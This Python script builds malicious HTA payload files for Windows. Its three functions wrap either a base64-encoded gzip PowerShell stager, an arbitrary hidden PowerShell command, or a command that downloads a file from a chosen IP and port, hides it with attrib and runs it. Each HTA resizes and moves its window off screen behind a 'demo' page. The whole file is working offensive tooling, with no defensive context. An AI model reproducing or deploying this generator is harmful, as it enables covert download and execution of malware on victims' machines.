#!/usr/bin/python3

#generates payload from binary file
def base64BIN(file):
	import base64
	import os

	preCom = "powershell -nop -noni -w hidden if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'/syswow64/WindowsPowerShell/v1.0/powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''"
	postCom = "''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"

	try:
		bin = open(file, "rb")
		encoded = base64.b64encode(bin.read())

		payload = open("pay.hta", "w")
		decoded = encoded.decode("ascii")
		payload.write("""
<HTML>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD>
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -4000,-4000
Set objShell = CreateObject("Wscript.Shell")
""")
		payload.write(f'objShell.Run "{preCom}{decoded}{postCom}"')
		payload.write("""
self.close
</script>
<body>
demo
</body>
</HEAD>
</HTML>
""")

		payload.close()
		print("\033[32m[+]\033[0m Payload generated successfully")
	except:
		payload.close()
		exit("\033[31[-]\033[0m Something went wrong")

#generating payload with ps script
def shell(command):
	import os

	try:
		payload = open("pay.hta", "w")
		payload.write("""
<HTML>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD>
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -4000,-4000
Set objShell = CreateObject("Wscript.Shell")
""")
		payload.write(f'objShell.Run "powershell.exe -noni -nop -w hidden {command}"')
		payload.write("""
self.close
</script>
<body>
demo
</body>
</HEAD>
</HTML>
""")
		payload.close()
		print("\033[32m[+]\033[0m Payload generated successfully")
	except:
		payload.close()
		exit("\033[31[-]\033[0m Something went wrong")



def request(shell, ip, port):
	try:
		payload = open("pay.hta", "w")
		payload.write("""
<HTML>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<HEAD>
<script language="VBScript">
Window.ReSizeTo 0, 0
Window.moveTo -4000,-4000
Set objShell = CreateObject("Wscript.Shell")
""")
		payload.write(f'objShell.Run "powershell.exe -noni -nop -w hidden Invoke-WebRequest http://{ip}:{port}/{shell} -OutFile C:/Users/$env:USERNAME/Documents/{shell}; attrib.exe +h C:/Users/$env:USERNAME/Documents/{shell}; start C:/Users/$env:USERNAME/Documents/{shell}"')
		payload.write("""
self.close
</script>
<body>
demo
</body>
</HEAD>
</HTML>
""")
		payload.close()
		print("\033[32m[+]\033[0m Payload generated successfully")
	except:
		payload.close()
		exit("\033[31[-]\033[0m Something went wrong")
